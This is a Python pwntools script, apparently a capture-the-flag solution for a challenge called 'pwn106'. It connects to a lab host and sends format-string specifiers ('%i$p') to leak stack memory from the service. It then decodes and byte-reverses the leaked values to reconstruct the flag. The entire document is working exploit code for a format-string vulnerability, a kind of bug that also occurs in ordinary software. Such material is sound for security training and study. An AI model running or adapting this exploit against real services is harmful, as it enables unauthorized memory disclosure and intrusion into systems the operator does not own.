#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './pwn106user.pwn106-user'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'warn'
host = '10.10.186.147'
port = 9006


# =========================================================
#                           FUZZ
# =========================================================

flag = ''

for i in range(0, 20): # Range is obtained by fuzzing locally 
    try:
        # Connect to server
        io = remote(host, port)
        # io = process(exe)
        # Format the payload to location on stack
        io.sendlineafter(b'giveaway: ', f'%{i}$p'.encode())
        # receive unneccesary lines 
        io.recvuntil(b'Thanks ')
        # receive leaked
        leak = io.recv()
        # ignore nulls
        if not b'(nil)' in leak:
            # print value if exist
            print(f'stack at-{i}' + ": " + str(leak))
            try:
                # unhex and decode leaked
                hexform = unhex(leak.split()[0][2:].decode())
                # append to flag and reverse endianess
                flag += hexform.decode()[::-1]
                # confirmation
                print("flag appended")
            except BaseException:
                pass
        io.close()
    except EOFError:
        io.close()

# Print flag
print(f'{flag=}')